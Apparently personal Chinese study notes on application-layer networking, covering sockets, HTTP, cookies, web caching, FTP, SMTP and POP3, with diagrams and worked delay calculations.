<li>参与的主机间歇性连接，且可以改变IP地址</li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530220314.png" /></p>
<p>这种模式下，所有的主机都成为对等体。如果有多个对等体请求一样的资源，那么某个对等体A可以向B请求片段1，同时向C请求片段2，依此类推，使其速率会非常快。同样的，A也会提供自己已下载的片段。这个特性称为p2p的<strong>自拓展性</strong>。</p>
<p>因为p2p中的对等体都是自发连接的，这种非集中式结构不仅难以管理，而且不可靠，且安全性不是很高。不可靠是因为如果只有一个用户请求资源，那么速度就会非常慢，p2p模式下没有人会去升级各种硬件设施从而提高链路带宽，就算有也没有足够的财力能够升级成大公司那样的带宽。自发性连接，谁也不知道这里面是否存在想干坏事的人，因此安全性不高，用户的杂、乱、多也使得p2p极其难管理。</p>
<h2 id="进程通信">1.2. 进程通信</h2>
<p>我们平常说使用某应用软件进行通信，<strong>本质上其实是进程与进程间进行通信</strong>。但是可以把进程理解为某个应用程序。</p>
<p>进程间通信一般分为两种：</p>
<ol type="1">
<li>同一端系统上的进程通信</li>
<li>不同端系统的进程通信</li>
</ol>
<p>对于前者，使用<strong>进程间通信机制</strong>进行通信，由操作系统定义。不同端系统的进程通过交换message进行通信。本节讨论的是后者。</p>
<p>进程也分为两类：</p>
<ol type="1">
<li><strong>客户端进程</strong>：发起通信的进程</li>
<li><strong>服务器进程</strong>：等待连接的进程</li>
</ol>
<p>分布式（不在同一端系统）进程通信需要解决三个问题：</p>
<ol type="1">
<li>Q1：发送的 message 如何找到对方进程？</li>
<li>Q2：应用层需要向传输层发送哪些信息？</li>
<li>Q3：发送的 message 要怎么让对方进程明白？</li>
</ol>
<h3 id="问题1进程寻址">1.2.1. 问题1：进程寻址</h3>
<p>一个进程为了接收
message，需要有一个标识，使其能够被找到。至少需要包含3个部分：</p>
<ol type="1">
<li>IP地址：用来唯一标识主机</li>
<li>采用传输层协议：TCP or UDP</li>
<li>端口号：唯一标识进程</li>
</ol>
<p>简单的解释：IP地址可以使源主机找到目标主机，这样子，message
就能够传输到目标主机。message
要通过正确的协议来解析，因此标识采用的协议能够使目标主机“看得懂信息”。端口号用来找到进程，TCP(or
UDP)拿到message之后需要将其经过一定处理，然后向上层提交给对应的进程，此时就需要端口。</p>
<p>TCP和UDP都具有对应的端口，且编号都是1-65535，所以不能只指定编号，而不指定协议！</p>
<h3 id="问题2穿过层间的信息">1.2.2. 问题2：穿过层间的信息</h3>
<p>应用层给传输层的消息必须携带下面三个：</p>
<ol type="1">
<li>要传输的报文</li>
<li>谁传的：源主机的 IP + TCP(UDP) + port</li>
<li>传给谁：目标主机的 IP + TCP(UDP) + port</li>
</ol>
<p>这样子传输层实体才能够根据这些信息对TCP报文段（UDP数据包）进行封装，然后传给下一层。</p>
<p>举个例子：我们发快递，不能够仅仅把货物给快递小哥，还需要把自己的地址以及接收方的地址一起给快递小哥，这样子我们的快递才能够成功被寄出去。</p>
<p>这样子其实会有一个小小的问题：如果源进程与同一目标进程一直通信，那么每次应用层都需要携带“老三样”，携带的信息多，且麻烦，不便于管理。这里面其实有变化的只有数据，而源进程和目标进程的地址信息是没有变化的。有没有一种机制能够记住通信的双方（或者单方，后面会说到）的地址信息，这样子每次层间就只需要传输数据就可以了。socket应运而生。</p>
<blockquote>
<p>个人理解：虽然socket是应用层和传输层的“约定”，但是，因为socket中带有IP地址，因此，网络层应该也是知道socket的。</p>
</blockquote>
<h4 id="tcp-socket">1.2.2.1. TCP socket</h4>
<p>socket 用一个代号标识通信双方的地址信息。这样子应用只要向传输层发送
socket
和数据即可，传输层会根据socket自动补充双方地址信息。TCP在建立连接的时候就会同时建立好socket。</p>
<p>注意 socket
是<strong>本地标识</strong>，并且是<strong>应用层和传输层的“约定”</strong>。使用
socket 可以使穿过层间的信息最少。</p>
<blockquote>
<p>本地标识：其他主机不认识你这个socket。即使是通信的双方，使用的socket代号也大概率不同。</p>
</blockquote>
<ul>
<li>TCP
socket是一个四元组：<code>(源IP, 源port, 目标IP, 目标port)</code>。协议标识放在头部；</li>
<li>一个 socket 唯一指定了一个会话；</li>
<li>本地进程使用这个标识，与远程进程通信</li>
<li>简单，便于管理</li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530225408.png" /></p>
<p>传输层会维护上图中的一张表。</p>
<p>下面有一个例子：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530225508.png" /></p>
<p>对于左、右两个主机来说，只需要一个socket
即可，对于中间的主机来说，就需要两个socket来分别指示与左边主机进程的通信，以及与右边主机进程的通信。</p>
<h4 id="udp-socket">1.2.2.2. UDP socket</h4>
<p>使用UDP，两个进程之间的通信是无连接的。所以 UDP socket 和 TCP socket
的不同就体现出来了，UDP socket
是一个二元组：<code>(源IP, 源port)</code>。此时 UDP socket
就是用来标识单方的。</p>
<p>因此，应用层通过 UDP socket
传输报文时，必须要提供目标IP和目标port。同样的，源主机传输层向应用层上传报文时也需要提供目标IP和目标port。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530230450.png" /></p>
<h4 id="socket总结">1.2.2.3. socket总结</h4>
<ul>
<li>进程向socket发送报文或者从socket接收报文</li>
<li>socket &lt;-&gt; 门户
<ul>
<li>发送进程将报文推出门户，其他的就不用管了</li>
<li>接收进程从门户接收报文，不用在乎报文是怎么到达的</li>
</ul></li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530230701.png" /></p>
<p>因此，socket
也称为应用程序和网络之间的<strong>应用程序编程接口(Application
Programming Interface, API)</strong></p>
<h3 id="问题3应用层协议">1.2.3. 问题3：应用层协议</h3>
<p>应用层协议：定义了在不同端系统上的应用进程如何相互交换报文。</p>
<ul>
<li>交换的<strong>报文类型</strong>：请求还是应答</li>
<li>各种报文类型的<strong>语法</strong>：报文中各个字段及其描述</li>
<li>字段的<strong>语义</strong>：字段取值的含义</li>
<li>进程何时、如何发送报文即对报文如何响应的<strong>规则</strong></li>
</ul>
<blockquote>
<p>应用包含很多部分。比如一个Web应用，包括HTTP协议，Web客户端/服务器，HTML等。应用层协议（HTTP协议）只是应用的一部分！
实体：仅仅表示<strong>实现网络协议的</strong>、<strong>运行中的</strong>软、硬件。</p>
</blockquote>
<p>应用层协议分为两种：</p>
<ol type="1">
<li>公开协议，比如HTTP，SMTP</li>
<li>专用（私有）协议，比如Skype</li>
</ol>
<h2 id="选择传输层服务的指标">1.3. 选择传输层服务的指标</h2>
<p>选择传输层服务的指标，也可以叫做如何描述传输层服务。这些指标的作用就是帮助应用程序去选择传输层提供的服务。主要有四个指标：</p>
<ol type="1">
<li>数据丢失率</li>
<li>吞吐量</li>
<li>时延</li>
<li>安全性</li>
</ol>
<p><strong>数据丢失率</strong>：有些应用要求100%的可靠传输。比如传文件，丢了一字节可能整个文件就乱码了。但流媒体就能够容忍一定的数据丢失。</p>
<p><strong>吞吐量</strong>：发送进程能够向接收进程交付的比特的速率。有些应用需要最小限度的吞吐才能够保证应用能够有效运作，比如电视和音频。但是有些应用则不需要，这些应用称之为弹性应用。</p>
<p><strong>时延</strong>：这个最好理解，打游戏就是一个时延敏感的应用。</p>
<p><strong>安全性</strong>：主要包括：机密性、完整性和可认证性（鉴别）。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530233320.png" /></p>
<p>需要注意的是，<strong>传输层提供的服务只能够保证数据的丢失率</strong>，而无法保证吞吐量和时延。平常我们打游戏的时候延迟有时候会比较高，看视频的时候经常转圈圈加载，这也体现了当前的传输层服务无法保证吞吐量和时延。但是这不代表时延敏感应用和需要最小限度的吞吐的应用无法运行，这类应用被设计成<strong>尽最大可能对付这种保证的缺乏</strong>，因此，当今的互联网能够为这些应用提供满意的服务，但是不提供任何时延和吞吐量的保证。</p>
<p>无论是TCP和UDP没有安全性可言，两者在网络中发送的是明文，也就是未经加密处理的。如果数据中包含用户名和口令，那么只需要一个抓包工具就能够获得其中的明文信息，非常不安全。针对该问题，Internet使用一种机制SSL(Secure
Sockets
Layer)，<strong>SSL运行在应用层，SSL运行在TCP之上，为TCP提供增强服务，但这种强化是在应用层上实现的。SSL运行在应用层协议之下，夹在TCP和应用层协议中间的位置</strong>。但是也可以认为它运行在传输层，因为某种意义上来说，SSL也是为应用提供服务的。因此，有些协议或者其他的层划分不是那么的明显。</p>
<p>SSL拥有自己的socket API，与TCP
socket类似。当一个应用使用SSL时，通过SSL
socket传递明文数据，SSL会先进行加密，并将加密后的数据传递给TCP
socket。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531084434.png" /></p>
<p>这里注意一下，只使用HTTP的就叫做HTTP，如果使用SSL +
HTTP，那么就是HTTPS，我们逛淘宝、京东的网页的时候看到的就是HTTPS。</p>
<p><strong>SSL</strong>：</p>
<ul>
<li>在TCP上连接，提供加密的TCP连接</li>
<li>私密性</li>
<li>数据完整性</li>
<li>端到端的鉴别</li>
</ul>
<h2 id="传输层提供的服务">1.4. 传输层提供的服务</h2>
<p>传输层向上层提供的服务就是大名鼎鼎的TCP和UDP。</p>
<p><strong>TCP服务</strong>：</p>
<ul>
<li>可靠的传输服务：不丢失，不出错，不乱序</li>
<li>流量控制</li>
<li>拥塞控制</li>
<li>面向连接</li>
<li>不能提供：时间保证、最小吞吐量保证和安全性</li>
</ul>
<p><strong>UDP服务</strong>：</p>
<ul>
<li>不可靠传输服务</li>
<li>不提供：可靠，流量控制，拥塞控制，时延，最小吞吐量，连接，安全</li>
</ul>
<p>那这就有一个问题了：<strong>UDP还有必要存在吗？</strong></p>
<p>答案是有必要。与TCP作比较，UDP虽然不提供非常多的服务，但是它的优势就在于工作量少，<strong>速度特别快</strong>。UDP不建立连接。不做可靠性工作，因此实现这些功能的时间都可以被节省下来。UDP也没有拥塞控制和流量控制，<strong>应用能够按照设定的速度发送数据</strong>，UDP不会管对方和网络情况，拿到数据直接发，简单易实现且速度快。</p>
<p>因此，对于某些应用，UDP是具有优势了，比如常说的流媒体。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531084336.png" /></p>
<h1 id="web和http">2. Web和HTTP</h1>
<ul>
<li><p>Web页面：由一些对象组成；</p></li>
<li><p>www：World Wide Web</p></li>
<li><p>对象可以是HTML文件，JPEG等图像，声音、视频等</p></li>
<li><p>Web页面 = base HTML + 引用对象</p></li>
<li><p>通过URL对每个对象进行引用</p></li>
<li><p>URL(uniform resource locator)格式</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531085023.png" /></p></li>
</ul>
<p>客户端是如和加载一个Web页面的呢？假设请求一个有着两个引用对象的Web页面：</p>
<ol type="1">
<li>客户端向服务器请求资源，拿到 base HTML 页面</li>
<li>根据HTML语法进行渲染，就是把页面画出来</li>
<li>遇到引用对象，先把框架画出来，内容先空着</li>
<li>base HTML渲染完之后，再去请求引用对象</li>
<li>将请求到的数据填入框架</li>
</ol>
<p>因此，网速不够的情况下总是会看见有些网页图片加载不出来，但是会有一个白框框，这就是为图片预留的位置。</p>
<h2 id="http概况">2.1. HTTP概况</h2>
<p>HTTP(HyperText Transfer Protocol)：超文本传输协议。</p>
<ul>
<li>Web的应用层协议</li>
<li>C/S模式</li>
<li>HTTP 1.0 和 HTTP 1.1</li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531085742.png" /></p>
<p><strong>HTTP使用的是TCP服务</strong>：</p>
<ul>
<li>客户发起一个与服务器的TCP连接，并且建立socket，默认端口后为80</li>
<li>服务器接收客户的TCP连接</li>
<li>在浏览器（HTTP客户端）与服务器（HTTP服务器）之间交换HTTP报文（应用层协议报文）</li>
<li>TCP连接关闭</li>
</ul>
<p><strong>HTTP是无状态的</strong>：</p>
<ul>
<li>服务器不维护关于客户的任何信息。只要有请求，服务器就回响应。</li>
<li>这意味着如果页面需要登录，那么每次我们请求该网页的一个资源的时候都要登陆一次！</li>
</ul>
<p>维护状态是非常复杂的：</p>
<ul>
<li>必须维护历史信息</li>
<li>如果服务器/客户端宕机，它们的状态信息就会出现不一致，此时一方就要帮助另一发恢复</li>
<li>无状态服务器能够支持更多的客户端</li>
</ul>
<h2 id="非持久和持久http连接">2.2. 非持久和持久HTTP连接</h2>
<p>非持久HTTP连接：</p>
<ul>
<li>最多只有一个对象在TCP连接上发送</li>
<li>下载多个对象需要多个TCP连接</li>
<li>HTTP 1.0 使用非持久HTTP连接</li>
</ul>
<p>持久HTTP连接：</p>
<ul>
<li>多个对象可以在一个TCP连接上传输</li>
<li>HTTP 1.1 默认使用持久连接</li>
</ul>
<p>举个例子，客户向服务器请求一个带有10个引用对象的Web页面，这10个引用对象也是服务器上的资源。</p>
<p>如果使用非持久HTTP连接：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531091818.png" /></p>
<p>可以看出，请求这样一个web页面，需要11次的TCP连接。</p>
<p>使用持久HTTP连接：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531092039.png" /></p>
<p>只需要建立一次TCP连接，就可以传完所有的对象。</p>
<p>我们引入一个概念，<strong>响应时间模型</strong>。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531092428.png" /></p>
<p>RTT: Round-Trip
Time，一个小的分组从客户端到服务器，再回到客户端的时间（传输时间可以忽略）</p>
<p>因此对于非持久连接来说，需要 <span
class="math inline">\(22RTT+对象传输时间\)</span> 来传输数据，<span
class="math inline">\(11RTT\)</span>
用来断开连接。而对于持久连接来说，只需要 <span
class="math inline">\(11RTT+对象传输时间\)</span> 传输数据，<span
class="math inline">\(1RTT\)</span> 断开连接。</p>
<p>从这就可以看出非持久HTTP连接的缺点：</p>
<ul>
<li>传输一个对象至少需要2个RTT（不包括断开连接）</li>
<li>操作系统给必须为每个TCP连接分配资源，比如说socket表</li>
</ul>
<p>而持久HTTP连接：</p>
<ul>
<li>服务器发送响应后，仍保持TCP连接</li>
<li>相同的客户和服务器之间的后续请求和响应报文通过相同的连接进行</li>
</ul>
<h3 id="流水线和非流水线">2.2.1. 流水线和非流水线</h3>
<p>持久的HTTP连接还有两种工作方式：</p>
<ol type="1">
<li><strong>流水线</strong>：发出所有请求，然后等待响应依次回来</li>
<li><strong>非流水线</strong>：发送一个请求，等待响应回来之后再发送另一个请求</li>
</ol>
<p>流水线与非流水线对比：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531214332.png" /></p>
<h2 id="http报文">2.3. HTTP报文</h2>
<p>大致分为两类：</p>
<ol type="1">
<li>请求报文</li>
<li>响应报文</li>
</ol>
<p>HTTP报文使用的ASCII码，所以人类可以阅读。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531093724.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531093734.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531093804.png" /></p>
<p>首部字段 Connection。刚刚说HTTP 1.1
默认是持久的HTTP连接，但可以认为的设置成非持久的，使用的就是
Connection字段。<code>Connection: close</code>表示的就是这次请求响应结束之后就断开TCP连接。</p>
<p>还有一点，如果带有实体，那么就会有一个字段：Content-Length。该字段表示实体中的字节数。因为传输层传输的是字节流，简单来说对于应用层来说的不同报文对于传输层来说它并不认识，只知道有字节需要传输，因此传输层不能够区分拿些字节是前一个报文的，哪些字节是后一个报文的。所以，应用层需要做好边界划分，通过
<code>Content-Length</code> 就能够区分前后报文的边界。</p>
<p>这一部分不是重点，我之前看过图解HTTP，所以这里不多赘述。</p>
<h2 id="cookie">2.4. cookie</h2>
<p>刚刚说了HTTP是一个无状态的协议，但是许多时候，网站需要记住客户的一些信息，比如网络购物，总不能没看一个商品都要登陆一次吧，而且购物车这个功能也是需要记住状态的。因此，这就是cookie的作用。</p>
<p>cookie主要有四个组成部分：</p>
<ol type="1">
<li>HTTP响应报文中的Set-cookie首部行</li>
<li>HTTP请求报文中的Cookie首部行</li>
<li>用户端系统中保留有一个cookie文件，由用户的浏览器管理</li>
<li>Web站点有一个后端数据库吗，用来存放用户的数据信息</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531101859.png" /></p>
<p>用户第一次登录的时候，在请求报文中带上用户名和密码。服务器接收之后在数据库中建立相应的表项，并记录用户当前状态，然后给用户回一个响应，带上
<code>Set-cookie: 12343</code>。用户可以在后续的请求中带上
cookie，这样服务器就能够利用cookie去服务器查找属于对应cookie的数据，并返回给用户。这就实现了<strong>维护状态</strong>的功能。</p>
<p>cookie能带来：</p>
<ul>
<li>用户验证</li>
<li>购物车</li>
<li>推荐</li>
<li>用户状态</li>
</ul>
<p>但是cookie带来便利的同时也会存在安全和隐私方面的问题。首先，后端数据库通过cookie读取对应用户的数据，也就是，不论是不是用户本人，只要拥有cookie，都能够获取对应的数据。因此，只要盗取了别人的cookie，就可以不用用户名和密码登录对方的账号。其次，后端数据库保存用户的数据信息，可能会存在违法贩卖信息的问题。</p>
<h2 id="web缓存">2.5. Web缓存</h2>
<h3 id="效果">2.5.1. 效果</h3>
<p>先举个例子，如下网络构造</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531102846.png" /></p>
<p>需求：机构内部网络的主机需要访问来自Internet另一方的origin
servers上面的资源。</p>
<p>假设：</p>
<ul>
<li>平均对象大小 100kb</li>
<li>机构内浏览器对原始服务器的平均请求率为 15个/s</li>
<li>机构路由器到Internet的带宽 1.54Mbps</li>
<li>边缘路由器到origins server再返回的时间为 2s</li>
<li>机构内主机到机构路由器的时间为 2ms</li>
</ul>
<p>结果：</p>
<ul>
<li>可以计算出接入链路流量强度 <span
class="math inline">\(I=La/R=100kb*15/1.54Mbps \approx
99\%\)</span></li>
<li>计算排队时延：<span class="math inline">\(d_{queue}=\frac I{1-I}
\ast \frac LR\)</span> ，因为 I
趋近于1，所以排队时延非常的长，这里假设是min级别的</li>
<li>每个用户的总时延：<span class="math inline">\(t=d_{queue} + 2s + 2ms
= min + s + ms \approx min\)</span> ，因此时延是分钟级别的</li>
</ul>
<p>这就是为什么WWW(World Wide Web)早期又被叫做 World Wide Wait。</p>
<p>那该如何解决这个问题呢？两种方法：</p>
<ol type="1">
<li>最简单暴力：这里的问题出在接入链路带宽上，只要接入带宽扩大就好了。</li>
<li>优雅的方法：Web 缓存</li>
</ol>
<p><strong>先介绍第一种</strong></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531105706.png" /></p>
<p>直_接将接入链路变为原来的100倍，那么此时的流量强度 <span
class="math inline">\(I \approx 1 \%\)</span>，因此排队时延也变小，<span
class="math inline">\(d_{queue}=\frac I{1-I} \ast \frac LR\)</span>
，变为ms级别的。</p>
<p>此时的总时延 <span class="math inline">\(t=ms + ms +s\)</span> 也就是
s 级别的。</p>
<p>虽然能够解决问题，但是100倍的带宽可不止原来100倍的钱，并且是每个月都要交这么多钱。是在不是一个经济的方法。</p>
<p><strong>第二种，Web缓存</strong></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531110908.png" /></p>
<p>在内部网络里装一台web缓存服务器（也叫代理服务器 proxy
server），内部网的主机所有的请求都会经过该缓存服务器，如果该缓存服务器中有请求的资源，直接返回给主机，如果没有，则缓存服务器会向origin
servers请求该资源，然后再返回给主机，并缓存该资源。</p>
<blockquote>
<p>28定律：80%的请求都是请求20%的资源。</p>
</blockquote>
<p><strong>因此，web缓存服务器可以通过缓存部分资源，使大部分主机的请求都能够在web缓存服务器中得到满足</strong>。这个叫做<strong>命中-hit</strong>。</p>
<p>也可以计算一下此时的总时延。假设40%的请求都能够在web缓存服务器中满足，剩下的60%需要请求origins
server。</p>
<p>那么此时总时延 <span class="math inline">\(t=t_1+t_2\)</span></p>
<p><span class="math display">\[
t_1=0.4 \cdot 15 \cdot 2ms = 12ms
\]</span></p>
<p><span class="math display">\[
I=\frac {La}R = \frac {100kb \cdot o.6}{1.54Mbps}
\]</span></p>
<p><span class="math display">\[
d_{queue}=\frac I{1-I} \ast \frac LR -&gt; ms 级别
\]</span></p>
<p><span class="math display">\[
t_2 = 0.6(2s + 2ms + d_{queue}) \approx 0.6 \cdot 2s = 1.2s
\]</span></p>
<p>那么总时延也就约等于 1.2 s。比扩大带宽的效果更好。</p>
<p>总结一下web缓存机制的好处：</p>
<ol type="1">
<li>对用户来说：响应速度变快了</li>
<li>对服务器来说：缓解了服务压力，部分的请求不会到达原始服务器</li>
<li>对整个网络来说：缓解了网络压力，部分的请求不会到互联网，内部就解决了</li>
<li>对机构来说：为用户提高了服务质量，且经济实惠</li>
<li>对ISP来说：我有一句脏话想讲</li>
</ol>
<h3 id="条件get方法">2.5.2. 条件GET方法</h3>
<p>Web缓存这个机制最主要的地方就在于：Web缓存服务器保存origin
server中的资源。但是会出现这么一种情况，就是web缓存服务器昨天从原始服务器保存了资源A，但是今天原始服务器中的资源A做了修改，变成A'，这时候用户的请求只会得到资源A，而得不到资源A'，这就存在Web缓存服务器和原始服务器<strong>版本不一致的问题</strong>。</p>
<p><strong>幸运的是HTTP协议中有一种机制就是用来解决该问题的————条件GET方法</strong>。该方法在HTTP请求中添加一个首部字段：<code>If-modified-since: &lt;date&gt;</code>。</p>
<p>工作流程如下：</p>
<p>用户A向缓存服务器请求一个对象，缓存服务器此时没有该对象，就像原始服务器请求，并保存下来。</p>
<p>一个星期以后，用户B像缓存服务器请求同一个对象，此时已经过了一个星期了，缓存服务器不知道原始服务器中该对象是否被修改，因此会向原始服务器发送一个带有
<code>If-modified-since: 上次请求该数据的具体时间</code>
的HTTP请求报文，原始服务收到之后首先检查对象是否经过了修改，如果对象被修改，则回复一个正常的响应报文，带上修改之后的数据；如果没有被修改，则回一个状态码
304 Not Modified 的响应报文，不带上数据。</p>
<p>缓存服务器收到响应报文之后将数据发给用户B，并且更新对象的数据以及请求时间。如果对象没有更改，则只更新请求时间，那么下一次再发送
<code>If-modified-since</code>
时，带的就是今天的时间，而不是一周前。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531113835.png" /></p>
<h1 id="ftp">3. FTP</h1>
<p>FTP: File Transfer Protocol。该协议建立在TCP之上。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531140557.png" /></p>
<p>简单来说就是客户可以通过FTP客户端与FTP服务器连接。向远程主机传输文件或者从远程主机下载文件。</p>
<p>采用的是C/S模式：</p>
<ul>
<li>客户端：发起连接的一方</li>
<li>服务器：远程主机</li>
</ul>
<p>采用的默认端口是 21/TCP</p>
<p>FTP的过程如下：</p>
<ol type="1">
<li>FTP客户端请求FTP服务器，两者通过21端口建立连接，并使用TCP作为传输协议。此时建立的连接称为<strong>控制连接（TCP
control connection）</strong></li>
<li>客户端通过控制连接发送身份认证信息</li>
<li>客户端通过控制连接发送各种命令浏览远程目录</li>
<li>如果收到一个文件传输命令，服务器会主动请求连接客户端的21端口，此时建立的连接叫做<strong>数据连接（TCP
data connection）</strong>，文件通过数据连接进行传输</li>
<li>一个文件传输完毕之后，服务器会关闭数据连接。</li>
</ol>
<p>这里有一个诡异的情况，一般来说都是客户端请求服务器建立连接，而这里建立数据连接的时候，是服务器请求客户端建立连接。</p>
<p>FTP与HTTP不同，它建立了两个连接：</p>
<ul>
<li>控制连接：带外(out of band)</li>
<li>数据连接：带内(in band)</li>
</ul>
<p>除此之外，FTP还是一个<strong>有状态的协议</strong>，FTP服务器需要维护用户的状态信息：当前所在路径，用户的账号以及对应的控制连接。</p>
<p>与HTTP相同的地方在于：</p>
<ul>
<li>两者都使用TCP</li>
<li>FTP在控制连接上也是以ASCII文本方式传送</li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531141528.png" /></p>
<h1 id="email">4. EMail</h1>
<p>电子邮件由三个主要组成部分：</p>
<ol type="1">
<li>用户代理</li>
<li>邮件服务器</li>
<li>简单邮件传输协议(SMTP, Simple Mail Transfer Protocol)</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531143022.png" /></p>
<p>我们作为用户，通过一些软件（比如，Outlook，网易邮箱等）来收发邮件，这个就是用户代理。本质上不是我们直接与服务器通信，而是我们使用应用程序，让应用程序与服务器进行通信。</p>
<blockquote>
<p>代理：如果A，B双方直接通信，那么就不需要代理。如果A，B之间的通信需要经过其他硬、软件来完成，那么这些资源就是代理。</p>
</blockquote>
<p>我们利用用户代理来将我们要发送的邮件发送给邮件服务器，或者从邮件服务器上读取邮件。</p>
<p>邮件服务器是电子邮件体系的核心。邮件服务器有两个功能：</p>
<ol type="1">
<li>邮箱：用来管理和维护发送给用户的邮件；（相当于收件箱）</li>
<li>报文队列（输出邮件队列）：用来保持待发送邮件报文；（邮件服务器不是为一个用户准备的，所以每个用户要发送的邮件总得有个先后顺序）</li>
</ol>
<p>邮件服务器之间的SMTP协议作用：发送Email报文（只是发送）</p>
<ul>
<li>客户端：发送方邮件服务器</li>
<li>服务器：接收端邮件服务器</li>
</ul>
<p><strong>无论客户还是服务器都是邮件服务器</strong>，既不是用户代理，也不是用户本身。</p>
<h3 id="smtp">4.1. SMTP</h3>
<ul>
<li>使用TCP在客户端和服务器之间传送报文。默认端口号为25</li>
<li><strong>直接传输</strong>：直接将报文从发送方服务器发送到接收方服务器。即使我在中国，你在美国，在网通的情况下，也是直接从我的邮件服务器发送到你的邮件服务器，不会经过其他邮件服务器。</li>
<li>传输有3个阶段：
<ol type="1">
<li>握手（建立连接）</li>
<li>传输报文</li>
<li>关闭</li>
</ol></li>
<li>命令/响应交互
<ul>
<li>命令：ASCII文本</li>
<li>响应：状态码和状态信息</li>
</ul></li>
<li>报文必须为7bit的ASCII码，超过这个范围的报文不予以发送</li>
</ul>
<p>举个例子：Alice给Bob发送报文</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531144448.png" /></p>
<ol type="1">
<li>Alice使用用户代理编写邮件，并发送给 <code>Bob@email.com</code></li>
<li>Alice的用户代理将邮件发送到邮件服务器；<strong>使用SMTP,
HTTP(后面说)</strong></li>
<li>邮件被放在了报文队列进行排队等待发送；</li>
<li>邮件从发送方的邮件服务器发送到接收方的邮件服务器；<strong>使用SMTP</strong></li>
<li>邮件服务器将邮件放到Bob的邮箱中；</li>
<li>Bob使用用户代理阅读邮箱中的邮件；<strong>使用POP3, IMAP or
HTTP</strong></li>
</ol>
<p>简单的SMTP交互：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531150401.png" /></p>
<p><strong>SMTP总结</strong>：</p>
<ul>
<li>SMTP使用持久连接。向上图中，只要不发送 '.'
就可以一直的发送多封邮件</li>
<li>SMTP要求报文为7bitASCII编码</li>
<li>SMTP使用 <code>CRLF.CRLF</code> 决定报文的尾部</li>
<li>SMTP只是将邮件发送出去的协议；可以采用HTTP或者其他协议从邮件服务器的邮箱中拉取邮件</li>
<li>HTTP的每个对象封装在各自的响应报文中，如果有引用对象需要建立新的连接。而SMTP多个对象包含在一个报文中，可以包含文字，图片，视频等多个对象。</li>
<li><strong>SMTP只是将邮件从发送方用户代理发送到接收方邮件服务器</strong></li>
<li>SMTP是直接传输，不使用其他邮件服务器进行中转。</li>
</ul>
<p><strong>邮件的报文格式</strong>：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531150954.png" /></p>
<p>问题出现了，刚刚说一个报文内部可以包含多个对象，假设包含一张图片，但是图片的数据并不全是ascii码字符，这该如何发送呢？</p>
<p>这就要说到<strong>报文格式的多媒体扩展</strong>。假设我们发送的报文中存在ASCII码字符，也存在非ASCII码字符，该怎么办呢？这就需要使用到编码。我们设定一种编码方式，将所有的字符统一编码，不管是ASCII码字符也好，非ASCII码字符也罢，都按照一样的规则编码，使编码得到的字符全部都是ASCII码字符，这样就能够通过SMTP发送出去，对方接收到之后，再通过相同的编码规则将其解码即可得到原来的数据。</p>
<blockquote>
<p>base64就是用来解决这个问题的。Base64是网络上最常见的用于传输8Bit字节码的编码方式之一，Base64就是一种基于64个可打印字符来表示二进制数据的方法。</p>
</blockquote>
<h3 id="邮件访问协议">4.2. 邮件访问协议</h3>
<p>通过上面的描述，现在一封邮件从发送方到接收方邮件服务器的过程已经清楚了，最后的问题就是接收方如何通过用户代理从邮件服务器中的邮箱读取自己的邮件呢？这就要谈到邮件访问协议，大致有3种：</p>
<ul>
<li>POP3(Post Office Protocol-Version 3)</li>
<li>IMAP(Internet Mail Access Protocol)</li>
<li>HTTP</li>
</ul>
<h4 id="pop3">4.2.1. POP3</h4>
<p>POP3是一个极为简单的邮件访问协议。当用户代理打开了一个到邮件服务器的TCP连接之后，POP3就开始工作。POP3按照3个阶段进行工作：</p>
<ol type="1">
<li>特许(authorizaiton)或者叫做用户确认阶段</li>
<li>事务处理阶段</li>
<li>更新阶段</li>
</ol>
<p><strong>在特许阶段</strong>，用户代理通过命令向服务器发送用户名和口令（明文形式）来进行身份确认，邮件服务器响应
<code>+OK</code> 或者 <code>-ERR</code>
告知用户代理用户确认是否通过。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531152338.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220531152353.png" /></p>
